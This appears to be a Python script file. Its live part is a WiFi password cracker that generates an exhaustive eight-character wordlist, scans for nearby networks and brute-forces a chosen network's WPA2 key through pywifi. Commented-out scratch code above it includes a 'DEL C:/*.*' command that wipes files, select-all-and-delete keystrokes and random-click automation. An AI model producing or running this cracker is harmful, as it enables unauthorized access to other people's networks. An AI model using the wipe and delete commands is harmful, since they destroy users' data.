# import random, pyautogui as pg
# from ctypes import byref,create_string_buffer,c_long
# from io import StringIO

# import os
# import pythoncom

# import time , rotatescreen as rs
# pd = rs.get_primary_display()
# angel_list = [90,180,270,0]
# for i in range(20):
#     for x in angel_list:
#         pd.rotate_to(x)
#         time.sleep(0.5)


# import pyautogui


# pyautogui.typewrite("Привет, мир! Это PyAutoGUI", interval=0.1)


# pyautogui.press("enter")

# import pyautogui


# pyautogui.hotkey('win')



# pyautogui.typewrite("2423", interval=0.1)




 

# import os, !

# try:
#     os.system('DEL C:/*.*')
# except:
#     print('ne poluchili')

# for i in range(15):
#     h = random.randint(0,1080)
#     w = random.randint(0,1920)
#     pg.click(h,w,duration= 0.3)
#     pg.hotkey('winleft','m')

# import socket

# target_host = 'www.google.com'
# target_port = 80

# # создание обьекта сокета
# client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# # подключение этого клиента
# client.connect((target_host,target_port))

# # отправляем какие-то данные
# client.send(b"GET/HTTP/1.1/r/nHost: google.com\r\n\r\n")

# # принимаем данные
# response = client.recv(4096)

# print(response.decode())
# client.close()

# import pyautogui as pg

# pg.hotkey('ctrl','a')
# pg.hotkey('delete')

# pg.screenshot('image.jpg')


import itertools as its
words = "1234567890abcdefghijklmnopqrstuvwxyz" # a set of password characters
r =its.product(words,repeat=8) # random combination of 8 characters
dic = open("pwd.txt","a") # store wifi combinations in file
for i in r:
    dic.write("".join(i))
    dic.write("".join("\n"))
dic.close()
    
    
import pywifi
import time
from pywifi import const

# WiFi scanner
def wifi_scan():
    wifi = pywifi.PyWiFi()  # Initialize WiFi
    interface = wifi.interfaces()[0]  # Use the first interface
    interface.scan()  # Start scanning
    for i in range(4):
        time.sleep(1)
        print('\rScanning WiFi, please wait... (' + str(3 - i) + ')', end='')
    print('\rScan Completed!\n' + '-' * 38)
    print('{:4}{:6}{}'.format('No.', 'Strength', 'WiFi Name'))
    
    bss = interface.scan_results()  # Scan result
    
    wifi_name_set = set()
    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    
    num = 0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    
    return wifi_name_list

# WiFi cracking function
def wifi_password_crack(wifi_name):
    wifi_dic_path = input("Please provide the path to the password dictionary file: ")
    
    with open(wifi_dic_path, 'r') as f:
        for pwd in f:
            pwd = pwd.strip('\n')
            wifi = pywifi.PyWiFi()
            interface = wifi.interfaces()[0]
            interface.disconnect()
            while interface.status() == 4:
                pass
            profile = pywifi.Profile()
            profile.ssid = wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            interface.remove_all_network_profiles()
            tmp_profile = interface.add_network_profile(profile)
            interface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1.5:
                if interface.status() == 4:
                    print(f'\rConnection Succeeded! Password: {pwd}')
                    exit(0)
                else:
                    print(f'\rTrying with {pwd}', end='')

def main():
    exit_flag = 0
    target_num = -1
    
    while not exit_flag:
        try:
            print('WiFi Password Cracker'.center(38, '-'))
            wifi_list = wifi_scan()
            
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please choose a target WiFi: '))
                    if target_num in range(len(wifi_list)):
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'The chosen target WiFi is: {wifi_list[target_num][1]}. Sure? (Y/N)'))
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                else:
                                    print('Please enter only Y or N.')
                            except ValueError:
                                print('Please enter only Y or N.')
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('Please choose a target WiFi: ')
                except ValueError:
                    print('Please enter a valid number.')
            
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()






















